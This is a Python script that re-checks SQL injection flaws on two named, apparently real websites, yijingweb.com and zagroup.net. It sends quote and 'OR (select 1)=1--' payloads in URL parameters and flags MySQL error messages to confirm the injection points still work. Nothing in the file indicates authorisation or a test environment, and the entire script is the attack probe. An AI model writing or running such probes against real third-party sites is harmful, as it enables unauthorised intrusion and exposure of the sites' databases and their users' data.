#!/usr/bin/env python3
"""re-verify SQLi on both sites - may have changed"""
import urllib.request, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

print("=== yijingweb ===")
for suffix, tag in [("id=686", "base"), ("id=686%27", "quote"), ("id=687%27", "quote687"),
                    ("id=686%27%20OR%20(select%201)=1--%20", "or-subq")]:
    code, body = fetch("http://yijingweb.com/webmall/detail.php?%s" % suffix)
    err = "MySQL Error" in body or "Database error" in body
    print("  %s [%s]: code=%s size=%d sqlerr=%s" % (tag, suffix[:35], code, len(body), err))

print("=== zagroup ===")
for suffix, tag in [("c=259", "base"), ("c=259%27", "quote"), ("c=260%27", "quote260"),
                    ("c=259%27%20OR%20(select%201)=1--%20", "or-subq")]:
    code, body = fetch("http://zagroup.net/news.php?%s" % suffix)
    err = "MySQL Query Error" in body or "syntax" in body.lower()
    print("  %s [%s]: code=%s size=%d sqlerr=%s" % (tag, suffix[:35], code, len(body), err))
